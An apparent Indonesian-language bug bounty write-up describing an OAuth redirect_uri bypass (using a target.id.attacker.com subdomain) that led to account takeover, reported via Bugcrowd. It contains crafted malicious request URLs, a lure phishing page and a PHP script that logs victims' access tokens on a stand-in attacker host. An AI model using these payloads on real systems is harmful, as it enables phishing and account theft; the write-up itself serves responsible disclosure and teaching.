---
layout: post
title: Bypass Open Redirect to Takeover Account via OAuth
categories: [Web Security, Bug bounty write-up]
author: Rafshanzani Suhada
---

Mungkin kalian sudah tidak asing lagi dengan metode `Takeover Account (OAuth)` yang memanfaatkan param `redirect_uri`. Diartikel ini akan menjelaskan Bypass Open Redirect yang mengakibatkan akun diambil alih. Untuk penjelasan apa itu Open Redirect dan Akun takeover kalian dapat membacanya diartikel berikut: 

* <https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html>
* <https://www.imperva.com/learn/application-security/account-takeover-ato/>

Pada umumnya bug ini hanya menambahkan / merubah param menjadi `redirect_uri=https://attacker.com`, namun pada kasus ini saya mendapatkan error pada saat menambahkan param tersebut. Lalu saya muncul ide untuk merubahnya menjadi `redirect_uri=https://target.com.attacker.com/`, cukup kaget dan ini ternyata berhasil.

![Terkejut](https://infosec.zerobyte.id/images/shock.gif)

Jika kurang jelas saya akan menjelaskan lebih detail.

**Request** :
```
https://auth.target.id/login?oidc_sp=google&redirect_uri=https://attacker.com/
```

Pada saat melakukan request tersebut terdapat **error**, Lalu saya merubah param `redirect_uri` menjadi `https://target.id.attacker.com/` dan ternyata berhasil mengalihkan url, jadi request berubah seperti berikut:

**Request** :
```
https://auth.target.id/login?oidc_sp=google&redirect_uri=https://target.id.attacker.com/
```

---

# Skenario

### Server (target.id.attacker.com)

Membuat file yang seolah olah target.id memiliki diskon untuk membeli produk

File: POC.html

```html
<!DOCTYPE html>
<html>
<body>

<h1>Discount 80% Plan Business</h1>

<p><a href="https://auth.target.id/login?oidc_sp=google&redirect_uri=https://target.id.attacker.com/">CLAIM NOW!</a></p>

</body>
</html>
```

File: index.php

```php
<?php
function redirect($url)
{
   header('Location: ' . $url);
   die();
}

$token = "$_SERVER[REQUEST_URI]";

$filetoken = fopen("token_param.txt", "a+") or die("Unable to open file!");
fwrite($filetoken, $token .PHP_EOL);
fclose($myfile);

redirect('https://target.id' . $token);
```

### Steps to Reproduce

* Attacker Mengirim url <https://target.id.attacker.com/POC.html> ke victim
* Ketika diklik "CLAIM NOW" oleh victim maka akan dialihkan ke target.id

Setelah proses tersebut selesai attacker melihat isi file `token_param.txt` yang dimana file tersebut tersimpan `ACCESS TOKEN` dan dapat digunakan untuk login victim.

### Bagaimana cara ambil alih akun dengan token tersebut?

Attacker dapat melakukan login hanya menggunakan `ACCESS TOKEN` tersebut. 

```
https://target.id/{TOKEN_PARAM}
```

---

Pada platform bugbounty di Bugcrowd termasuk P2 (Priority 2) atau High.

![Bugcrowd](https://infosec.zerobyte.id/images/OAuth_Bugcrowd_P2.png)

Dalam kasus ini saya melakukan report diplatform Bugcrowd & mendapatkan reward sebesar $400

![Hore](https://infosec.zerobyte.id/images/Prof-reward_1.png)

Mohon maaf jika yang saya jelaskan kurang jelas, karena saya memang tidak begitu pandai membuat tulisan.

"Tetaplah rendah hati dan selalu memiliki keinginkan untuk menjadi sesuatu yang diinginkan."
